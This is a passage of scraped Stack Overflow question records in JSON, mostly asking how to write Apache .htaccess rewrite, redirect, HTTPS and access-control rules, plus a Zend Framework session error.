have checked the htaccess file and it has nothing relevant in there from what I can see, I've attached it just in case though. </p>\n\n<pre><code>Options +FollowSymlinks\n\n# Prevent Directoy listing \nOptions -Indexes\n\n# Prevent Direct Access to files\n&lt;FilesMatch \"\\.(tpl|ini|log)\"&gt;\n Order deny,allow\n Deny from all\n&lt;/FilesMatch&gt;\n\n# SEO URL Settings\nRewriteEngine On\n# If your opencart installation does not run on the main web folder make sure you folder it does run in ie. / becomes /shop/ \n\nRewriteBase /online-ordering/\nRewriteRule sitemap.xml /index.php?route=feed/google_sitemap\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n</code></pre>\n\n<p>Any ideas guys?</p>\n"},{"tags":[".htaccess","http-status-code-301","http-redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13111200,"title":"How to redirect 301 website.pl/page to website.pl/page/?","body":"<p>Is it possible to redirect from website.pl/page to website.pl/page/ ? My .htaccess file is\n<a href=\"http://paweljanicki.pl/htaccess.txt\" rel=\"nofollow\">my htaccess file</a>.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":20,"score":-1,"question_id":13108022,"title":"mod_rewrite slash and header.php didn't include with slash in url","body":"<p>I Need Help With My <strong>.htaccess</strong> file .. Now i have link like that <a href=\"http://www.afrogfx.com/20121028050853/Test.html\" rel=\"nofollow\">http://www.afrogfx.com/20121028050853/Test.html</a>\nproblem located with <strong>Slash /</strong> !! if you click on my link you will found link without style if remove slash you will get 404 Not Found Like That <a href=\"http://www.afrogfx.com/20121028050853Test.html\" rel=\"nofollow\">http://www.afrogfx.com/20121028050853Test.html</a>\nTry it !! \n<strong>Here Is my .htaccess</strong> </p>\n\n<pre><code>    RewriteEngine On\n\n    RewriteRule ^([a-zA-Z0-9-/]+).html$ readmore.php?url=$1\n    RewriteRule ^([a-zA-Z0-9-/]+).html/$ readmore.php?url=$1\n</code></pre>\n\n<p><strong>readmore.php</strong></p>\n\n<pre><code>    &lt;?php\n    include ('config/connect_to_mysql.php');\n    $url=$_GET['url'];\n    if($_GET['url'])\n    {\n    $url=mysql_real_escape_string($_GET['url']);\n    $url=$url.'.html'; //Friendly URL \n\n    $sql=mysql_query(\"select * from posts where url='$url'\");\n    $count=mysql_num_rows($sql);\n    $row=mysql_fetch_array($sql);\n    $title=$row['title'];\n    $text=$row['text'];\n    }\n    else\n    {\n    echo '404 Page.';\n    }\n\n    ?&gt;\n</code></pre>\n\n<p><strong>Problem Here</strong></p>\n\n<pre><code>    &lt;?php\n    include('styles/header.php');\n    include ('styles/leftblock.php');\n    include ('styles/mrnuleft.php');\n    ?&gt;\n\n\n\n\n\n\n    &lt;?php\n    if($count)\n    {\n\n    echo \"&lt;h1&gt;$title&lt;/h1&gt;&lt;div class='text'&gt;$text&lt;/div&gt;\";\n    }\n    else\n    {\n    echo \"&lt;h1&gt;404 Page.&lt;/h1&gt;\";\n    }\n    ?&gt;\n</code></pre>\n"},{"tags":["php","zend-framework","session",".htaccess","zend-auth"],"answer_count":10,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":9564,"score":5,"question_id":2418124,"title":"\"session has already been started....\" exception in Zend Framework application","body":"<p>I get this error when trying to load a Zend Framework application:</p>\n\n<blockquote>\n  <p>Fatal error: Uncaught exception\n  'Zend_Session_Exception' with message\n  'session has already been started by\n  session.auto-start or session_start()'\n  in\n  /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Session.php:462</p>\n  \n  <p>Stack trace:</p>\n  \n  <p>#0 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Session/Namespace.php(143):\n  Zend_Session::start(true)</p>\n  \n  <p>#1 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Auth/Storage/Session.php(87):\n  Zend_Session_Namespace->__construct('Zend_Auth')</p>\n  \n  <p>#2 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Auth.php(91):\n  Zend_Auth_Storage_Session->__construct()</p>\n  \n  <p>#3 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Auth.php(141):\n  Zend_Auth->getStorage()</p>\n  \n  <p>#4 /www/htdocs/w00a1ed7/autospin/redaktion/application/layouts/scripts/layout.phtml(31):\n  Zend_Auth->hasIdentity()</p>\n  \n  <p>#5 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/View.php(108):\n  include('/www/htdocs/w00...')</p>\n  \n  <p>#6 /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/View/Abstract.php(831):\n  Zend_View->_run('/www/htdocs/w00...')</p>\n  \n  <p>#7 /www/htdocs/w00a1ed in /www/htdocs/w00a1ed7/autospin/redaktion/library/Zend/Session.php\n  on line 462</p>\n</blockquote>\n\n<p>I Use <code>Zend_Auth</code> and on my local server and it works well, but on a production server I get the preceding error, but not every time.</p>\n\n<p>I have checked that <code>session.autostart</code> is set to <code>0</code> in the <code>.htaccess</code> file.</p>\n\n<p>How do I fix this error?</p>\n\n<hr>\n\n<p>Thank you for your Answer, but I do not user session_start() anywhere. Work only with ZF.</p>\n\n<p>I Have this Problem only on shared server, on my local server script works perfectly.</p>\n\n<p>I Use INIT Function with this code:</p>\n\n<p>protected $user;</p>\n\n<pre><code>public function init()\n{   \n    if(!Zend_Auth::getInstance()-&gt;hasIdentity())\n    {\n        $this-&gt;_redirect('auth/login');\n    }else\n    {\n        $this-&gt;user = Zend_Auth::getInstance()-&gt;getIdentity();\n    }\n}\n</code></pre>\n\n<p>I allready try to set tis code only in indexAction, so that other actions do not have to chack the Auth... but still have problems.</p>\n\n<p>Ist there a way to set in an Action to do not check about session or somethink like this?</p>\n\n<p>Beste regards</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13110045,"title":"Apace: Deny access to all files not caught by a mod_rewrite rule","body":"<p>Id like to deny access to everything, except /json-rpc, which should be redirected to /json-rpc.php. My current configuration is:</p>\n\n<pre><code>Options -Indexes\n\nOrder Deny,Allow \nDeny from All \n\n&lt;Files \"json-rpc\"&gt; \n     Order Deny,Allow \n     Allow from All\n&lt;/Files&gt;\n\n&lt;Files \"json-rpc.php\"&gt; \n     Order Deny,Allow \n     Allow from All\n&lt;/Files&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^json-rpc$ json-rpc.php [NC,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>The problem with this is that it allows access to /json-rpc.php directly. How do I make it so that /json-rpc is the ONLY resource available?</p>\n"},{"tags":["php",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":33,"score":-2,"question_id":13111389,"title":"Working with .htaccess but I don't know it","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3927527/how-to-setup-optional-parameters-in-mod-rewrite\">How to setup optional parameters in mod_rewrite</a><br>\n  <a href=\"http://stackoverflow.com/questions/4982948/rewrite-multiple-parameters-htaccess\">rewrite multiple parameters .htaccess</a><br>\n  <a href=\"http://stackoverflow.com/questions/13102864/how-to-use-directory-names-as-options-or-parameters\">How to use directory names as options or parameters?</a>  </p>\n</blockquote>\n\n\n\n<p>The below htaccess line I am using works, but it forces me to have params. Is it possible to make params optional?</p>\n\n<p>This is the code:</p>\n\n<pre><code>RewriteRule ^settings/(.*)/(.*)$ controller/settings.php?method=$1&amp;param=$1 [NC]\n</code></pre>\n\n<p>This forces me to load the URL like:</p>\n\n<pre><code>http://example.com/settings/load_method/no_params+i_still_need_to_have_this_here\n</code></pre>\n"},{"tags":[".htaccess","google-analytics","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13090585,"title":"Redirect with URL parameter added","body":"<p>In order to see in Google Analytics how many 301 forwards happen from olddomain.com to newdomain.com I understand that I can <a href=\"http://webmasters.stackexchange.com/a/27459\">add a url parameter</a></p>\n\n<p>However the following doesn't seem to work on the homepage, only subpages:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\n  RewriteCond %{HTTP_HOST} ^olddomain.com$ [OR]\n  RewriteCond %{HTTP_HOST} ^www.olddomain.com$\n  RewriteRule (.*)$ http://newdomain.com/$1?utm_source=olddomain.com&amp;utm_medium=redirect [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Your help greatly appreciated!</p>\n"},{"tags":["security",".htaccess","http","https","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":13110663,"title":"Forcing HTTPS over HTTP","body":"<p>So I want to force the user to access the https version of my page rather than the http. And according to <a href=\"http://stackoverflow.com/questions/8476324/using-https-instead-of-http\">this</a> post all I have to do is this:</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{SERVER_PORT} 80 \nRewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n</code></pre>\n\n<p>But <em>MY</em> site resides in a folder within the main directory, so it's in <code>www.domain.com/Folder</code>. So should this htaccess code go inside the main directory or in the subdirectory. Because I do not want to change the way the access the main site, only the folder. </p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2621,"score":2,"question_id":4410830,"title":"htaccess add trailing slash and force www with clean urls","body":"<p>I'm using my htaccess file with mod_rewrite to create clean urls like this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I would also like to force the site to have the 'www' subdomain and most importunately add a trailing slash if the url doesn't have one.  </p>\n\n<p>I am an absolute noob with mod_rewrite and I've tried accomplishing this on my own by combining other code I found on google (sad I know), but I always end up with a 500 error.  </p>\n\n<p>Here's the code I found for force www:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions +FollowSymLinks\nRewriteCond %{HTTP_HOST} ^www\\.domain\\.tld$ [NC]\nRewriteRule ^(.*)$ http://domain.tld/$1 [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks for your help. </p>\n"},{"tags":["php","regex",".htaccess","search"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13109516,"title":"Efficient way to find any key of array as a substring in a text","body":"<p>I have an input text</p>\n\n<pre><code>$text =\"this is just a normal text with max length of 150 characters\"\n</code></pre>\n\n<p>I have an array of size 400 </p>\n\n<pre><code>$keywordArray = array(\"this\",\"that\",\"who\",\"where\",\"abuse\",\"spam\",\"..\");\n</code></pre>\n\n<p>Now I want to find if this any substring of $text belongs to $keywordArray</p>\n\n<p>One way is </p>\n\n<pre><code>1) break the $text in words \n2) take each word and check in the array \n          if it contains that word\n                  return true;\n3) exit\n</code></pre>\n\n<p>Please suggest any better solutions in php for this. \nCan I use a regex for this?\nOr any other approach.\nI need this for a webapp with huge number of web pages to filter out spam pages based on url's text. </p>\n\n<p>And also can we handle this using .htaccess file (putting a rewrite rule).</p>\n\n<pre><code>Rewriterule (regex forspammedurls) spammedpage.php [L] \nRewriterule (.*) normalpage.php [L] \n</code></pre>\n\n<p>Just want to understand, at php level or at Apache level I should handle this.\nPlease give your suggestions.\nThanks,</p>\n"},{"tags":["asp.net",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":368,"score":0,"question_id":5780089,"title":".htaccess rewriting-url in aspx site?","body":"<p>Is it possible to use .htaccess url-rewriting rules in an ASPX website?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13107716,"title":"htaccess deny from *.ru or deny from .ru","body":"<p>I am aware that blocking by host extension can cause unwanted server load but which is correct? For example...</p>\n\n<p>deny from *.ru</p>\n\n<p>or</p>\n\n<p>deny from .ru</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13103585,"title":"htaccess Rewrite url dynamic length","body":"<p>I'm starting on a website project where I want to rewrite urls with a dynamic length. For example, the following url's can exist in the site:</p>\n\n<pre><code>http://www.url.com/signup/\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>http://www.url.com/profile/mark/pm/compose/\n</code></pre>\n\n<p>Now I've got a .htaccess script working, but I doubt it's efficiency. Here's the code:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\n\nRewriteRule ^([a-zA-Z0-9_-]+)$ index.php?page=$1\nRewriteRule ^([a-zA-Z0-9_-]+)/$ index.php?page=$1\n\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)$ index.php?page=$1&amp;subone=$2\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/$ index.php?page=$1&amp;subone=$2\n\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)$ index.php?    page=$1&amp;subone=$2&amp;subtwo=$3\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/$ index.php?page=$1&amp;subone=$2&amp;subtwo=$3\n\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)$ index.php?page=$1&amp;subone=$2&amp;subtwo=$3&amp;subthree=$4\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/$ index.php?page=$1&amp;subone=$2&amp;subtwo=$3&amp;subthree=$4\n\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)$ index.php?arg[0]=$1&amp;arg[1]=$2&amp;arg[2]=$3&amp;arg[3]=$4&amp;arg[4]=$5\nRewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/$ index.php?arg[0]=$1&amp;arg[1]=$2&amp;arg[2]=$3&amp;arg[3]=$4&amp;arg[4]=$5\n</code></pre>\n\n<p>I actually want to do something like this, but I can't figure out how I get it working...</p>\n\n<pre><code>RewriteRule ^{[a-zA-Z0-9_-]+}/$ index.php?urlvar={$#}\n</code></pre>\n\n<p>So the url </p>\n\n<pre><code>http://www.url.com/profile/mark/pm/compose/\n</code></pre>\n\n<p>Will result in </p>\n\n<pre><code>http://www.url.com/index.php?urlvar[0]=profile&amp;urlvar[1]=mark&amp;urlvar[2]=pm&amp;urlvar[3]=compose\n</code></pre>\n\n<p>Anyone whow knows how to fix this? </p>\n"},{"tags":["html",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13103855,"title":"Point image request to a higher folder thru htaccess","body":"<p>Is there any rule I can write to make all requests to my image folder point up one folder. I'm dealing with a lot of links so I don't want to put ../</p>\n\n<p>Eg: <a href=\"http://hostingxtreme.com/ajax/images/logo.png\" rel=\"nofollow\">http://hostingxtreme.com/ajax/images/logo.png</a>.</p>\n\n<p><strong>Should become</strong> <a href=\"http://hostingxtreme.com/images/logo.png\" rel=\"nofollow\">http://hostingxtreme.com/images/logo.png</a></p>\n\n<p>Thanks  </p>\n\n<p>Here the code I'm using\nDosent seem to be working!<br>\n    <code>php_value register_long_arrays On<br>\n    &lt;IfModule mod_rewrite.c&gt;<br>\n    RewriteEngine On<br>\n    RewriteBase /<br>\n    RewriteRule ^index\\.php$ - [L]<br>\n    RewriteCond %{REQUEST_FILENAME} !-f<br>\n    RewriteCond %{REQUEST_FILENAME} !-d<br>\n    RewriteRule . /index.php [L]<br>\n    RewriteEngine On<br>\n    RewriteRule ^/?ajax/images/logo.png$ /images/logo.png [L,R=301]<br>\n    &lt;/IfModule&gt;</code></p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":16,"score":-1,"question_id":13106876,"title":"htaccess redirect and matching","body":"<p>I'm trying to create a 301 redirect with my htaccess so that</p>\n\n<p><a href=\"http://subdomain.mysite.com/aff.php?aff=001\" rel=\"nofollow\">http://subdomain.mysite.com/aff.php?aff=001</a></p>\n\n<p>redirects to</p>\n\n<p><a href=\"http://www.mysite.com/folder/001\" rel=\"nofollow\">http://www.mysite.com/folder/001</a></p>\n\n<p>Now I know how to create it so that it redirects with those exact URLs but what I can't get to work is so that it will match \"001\" in the redirect.  The number will be different for different members.  Any help would be greatly appreciated!</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":158,"score":0,"question_id":7527955,"title":"htaccess conflicting with wordpress htaccess","body":"<p>I have the following code in my htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} !^www.example.com$\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301]\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>I avoid editing the automated code by Wordpress because the changes may be erased and I'll have to do it all again. I have another site running the first three lines of code and it's working perfectly to replace <em>example.com</em> for <em>www.example.com</em>. That's all I really need for this <em>example.com</em> site but still preserving the Wordpress properties.</p>\n\n<h2>The problem</h2>\n\n<p><em>example.com</em> is not redirecting to <em>www.example.com</em> but instead displaying a 301 error.</p>\n"},{"tags":["php","javascript",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13106299,"title":"Redirect using htaccess based on referrer","body":"<p>We only want users from a specific website to use our services. Is there a way to redirect all traffic that does not come from a specific referrer, to a website of our choosing, via htaccess? </p>\n\n<p>Also, this is for the first page only. So if they get to our site, they're going to browse a new page, and their referrer for the new page would apparently be the site they are already on. </p>\n\n<p>Thank you! </p>\n"},{"tags":["javascript",".htaccess","mime-types"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":159,"score":4,"question_id":12935119,"title":"Set my JS MIME type to \"text/javascript\"","body":"<p>According to this: <a href=\"http://stackoverflow.com/questions/4101394/javascript-mime-type\">Javascript MIME Type</a>, it seems that I should be serving my JS as \"text/javascript\". When I inspect the network communication between my browser and localhost (or my server), the MIME type of the JS that are hosted on my web server is application/x-javascript. The JS from Google CDN (e.g. jQuery) is text/javascript.</p>\n\n<p>I want to make my JS become text/javascript. In my .htaccess, I tried adding this: <code>AddType text/javascript .js</code>, but  it  didn't change my MIME type.</p>\n\n<p>Suggestions?</p>\n"},{"tags":["html",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13105845,"title":"Rewrite a Specific URL with htaccess","body":"<p>Ok, So I am very noob with htaccess. Basically, I want my site</p>\n\n<p><a href=\"http://mydomain.com/game.html\" rel=\"nofollow\">http://mydomain.com/game.html</a>\nto go to\n<a href=\"http://mydomain.com/index.php?page=game\" rel=\"nofollow\">http://mydomain.com/index.php?page=game</a></p>\n\n<p>I don't have a current .htaccess because almost all I've tried, have failed.\nDoes anyone have a working one to that?</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":39,"score":-2,"question_id":13105512,"title":"deny public access to a folder but still accessible from other php files","body":"<p>I was wondering what is the best way you would deny public access to a folder, but other files on the server can access it? </p>\n\n<p>For example, my templates and scripts I've paid for</p>\n\n<pre><code> public/template/header.html\n public/template/paidscript.js\n</code></pre>\n\n<p>I don't want anyone to access files inside of template folder, but</p>\n\n<pre><code> public/folder/index.php \n</code></pre>\n\n<p>and the index.php can have this code inside</p>\n\n<pre><code>&lt;?php include (../tempalte/header.html);\ninclude (../tempalte/paidscript.js);  ?&gt;\n</code></pre>\n\n<p>and any other files on the server can access it. </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13105416,"title":"mod rewrite htaccess display link","body":"<p>I'm having an issues with mod rewrite displaying the link in the browser correctly </p>\n\n<p>I have always put links on my pages like this</p>\n\n<pre><code> http://domain.com/contact-us.html\n</code></pre>\n\n<p>and then use this in my .htaccess file</p>\n\n<pre><code> Options FollowSymLinks\n RewriteEngine On\n RewriteRule ^([^.]+)\\.html$ http://domain.com/index.php?h=$1 [L]\n</code></pre>\n\n<p>I request the h variable on the index.php page to get and use the slug \"contact-us\"</p>\n\n<pre><code> $h = htmlspecialchars($_REQUEST['h'], ENT_QUOTES, 'UTF-8', false);\n $h = preg_replace('/[^-a-z0-9_]/i','',$h);\n</code></pre>\n\n<p>This has always worked fine and will still show the domain.com/contact-us.html in the browser</p>\n\n<p>I loaded a site on 1 and 1 and instead of seeing domain.com/contact-us.html I see domain.com?h=contact-us in the browser. Everything is working except it is not showing the link correctly</p>\n"},{"tags":["string","query",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13103717,"title":"Redirecting in HTACCESS from Query String to URL","body":"<p>I am trying to redirect a URL with a query string to a URL without a query string, however, I would like to use values from the query string.</p>\n\n<p>In my example below I am using a single state however I want it to be dynamic, meaning it will parse any URL with a query string down to a clean URL which still contains the value from the query string.</p>\n\n<pre><code>Example: http://www.mywebsite.com/?state=CA redirects to http://www.mywebsite.com/CA/\n</code></pre>\n\n<p>I have tired to add the information below into my HTACCESS file with no luck:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /\\?state=([a-z]+)&amp;type=([a-z\\-]+)\nRewriteRule ^ /%1/%2? [L]\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /\\?state=([a-z]+)($|\\ )\nRewriteRule ^ /%1? [L]\n</code></pre>\n\n<p>These have worked however I must input every redirect which I would like to avoid:<br/></p>\n\n<pre><code>RewriteCond %{QUERY_STRING} state=FL\nRewriteRule ^$ \"http://www.mywebsite.com/fl/?\" [R=301,L]\nRewriteCond %{QUERY_STRING} state=RI\nRewriteRule ^$ \"http://www.mywebsite.com/ri/?\" [R=301,L]\n</code></pre>\n\n<p>Any ideas? I am using WordPress on Apache. I believe everything is up to date.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":3,"favorite_count":3,"up_vote_count":0,"down_vote_count":1,"view_count":120,"score":-1,"question_id":12883273,"title":".htaccess RewriteRule and css, js, images issue","body":"<p>i've following rule for <code>.htaccess</code></p>\n\n<pre><code>Options +FollowSymLinks\n\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} -f [OR]\n\nRewriteRule ^detail/([0-9]+)/?$ detail.php?id=$1\n</code></pre>\n\n<p>it is redirects <code>http://localhost/detail/123</code> url to <code>http://localhost/detail.php?id=123</code> the page redirects successfully but problem is <code>css, js, images</code> are not loading,</p>\n\n<p>css, js files are located under <code>http://localhost/css/</code> and <code>http://localhost/js/</code></p>\n\n<p>one solution is that use <strong>absolute path</strong> (ex /css, or /js rather than just css/, /js but this is not looks a reliable solution since we've to change it on all files,</p>\n\n<p>any other solution based on <code>.htaccess</code> rules, which is independent from editing all php files and let us use \"relative paths\" ??</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13086521,"title":"Use .htaccess to whitelist two files for execution","body":"<p>I have a website that has a folder for images.</p>\n\n<p>I have two problems:</p>\n\n<ol>\n<li>I want to disable all script execution in that directory (i.e. no PHP/Perl/Python \nanything.) </li>\n<li>There are two php files in my images folder called gradient.php and rgba.php – I do what those to run as per usual.</li>\n</ol>\n\n<p>How do I set up my <code>.htaccess</code> file to do that. Also, rather than placing a new <code>.htaccess</code> in the images directory, is it possible to incorporate these directives in the one in the site root?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13102776,"title":"How can I math a regular expression to write an htaccess rule","body":"<p>I want this URL</p>\n\n<p><a href=\"http://rebateninja.com/index.php?page=home\" rel=\"nofollow\">http://rebateninja.com/index.php?page=home</a></p>\n\n<p>To be previewed like this via htaccess</p>\n\n<p><a href=\"http://rebateninja.com/home\" rel=\"nofollow\">http://rebateninja.com/home</a></p>\n\n<p>I know it is not that hard and I have done that before, but for some reason it is not working now at all. My .htaccess contains the following:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule (index.php\\?page=)(.*) /$2 [NC,R=301,L]\n</code></pre>\n\n<p>What I am doing wrong? Perhaps it is related to my Apache version? I have lost my entire morning without success!!! Thanks for your answers.</p>\n"},{"tags":["php","html",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":674,"score":1,"question_id":5536328,"title":"Htaccess form POST doesn't work?","body":"<p><br>\nI have a form with an action that redirects to a page;<br>\n<code>&lt;form method=\"post\" action=\"active\"&gt;</code>  </p>\n\n<p>The \"active\" page is a rewritten rule;<br>\n<code>RewriteRule ^active$ active_form-sec.php</code>  </p>\n\n<p>The page with the form is also a RewriteRule.</p>\n\n<p>The problem is, everytime I submit the form and I get on the active page, the POSTs are empty.<br>\nHow can I fix this problem?<br>\nThanks in advance!</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":3927,"score":3,"question_id":499068,"title":"Clean URL Redirect Loop","body":"<p>I'm trying to create clean URLs on my website. Now I succeeded in configuring apache so every request like <em>mysite.com/page</em> will work. But I also want that requests for <em>mysite.com/page.php</em> will be redirected to <em>mysite.com/page</em>. I've set environment variable in .htaccess to check if i already been redirected to prevent loops, but i still get them...\nHere's the .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions +FollowSymlinks\n\nRewriteEngine On\nRewriteBase /\n\n# set the variable\nRewriteRule ^$ - [L]\nRewriteRule ^(.*)$ $1 [E=REWROTE:0]\n\n# this works fine\n# make mysite.com/page work and set REWROTE variable to 1\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php [L,E=REWROTE:1]\n\n# but if i enable this, i get redirected and then stuck in a loop\n# redirect mysite.com/page.php to mysite.com/page , but only if REWROTE not 1\n#RewriteCond %{ENV:REWROTE} !^1$\n#RewriteRule ^(.*)\\.php$ $1 [R=301,L]\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["php","apache",".htaccess","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13102012,"title":"Htaccess redirection to https","body":"<p>I am using the following httaccess content, to force rewrite the url's to use https instead of http</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{SERVER_PORT} 80\nRewriteRule ^(.*)$ https://www.mydomain.com/$1 [L]\n</code></pre>\n\n<p>But it's always getting,\nThe page isn't redirecting properly</p>\n\n<pre><code>Firefox has detected that the server is redirecting the request for this address\nin a way that will never complete.     \nThis problem can sometimes be caused by disabling or refusing to accept\ncookies.\n</code></pre>\n\n<p>I've used many other solutions but always getting this...</p>\n"},{"tags":["mysql",".htaccess","mod-rewrite","rewritemap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":7329212,"title":"Problems with RewriteMap MapType dbd","body":"<p>Continuing from another discussion here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/7320979/mysql-htaccess-mod-rewrite\">MySQL + htaccess mod_rewrite?</a></p>\n\n<p>Where I was asked to start another question.</p>\n\n<p>I added this to my httpd.conf file:</p>\n\n<pre><code>DBDriver mysql\nDBDParams \"host=*****,user=*****,pass=*****,dbname=*****\"\nRewriteEngine On\nRewriteMap hrci \"dbd:SELECT title FROM challenges WHERE id = %s\"\n</code></pre>\n\n<p>When I tried to restart Apache I got this error:</p>\n\n<pre><code>RewriteMap: file for map hrci not found:/dh/apache2/apache2-ps54462/dbd:SELECT title FROM challenges WHERE id = %s\n</code></pre>\n\n<p>It looks like it's completely ignoring the <code>dbd</code> part and trying to read the whole thing as a file name. I really don't know what I'm doing wrong.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I tried simplifying this and just using a straight text file for the map:</p>\n\n<p>RewriteMap hrci txt:/home/username/rewrite.txt</p>\n\n<p>There is a text file in the root directory that contains simply 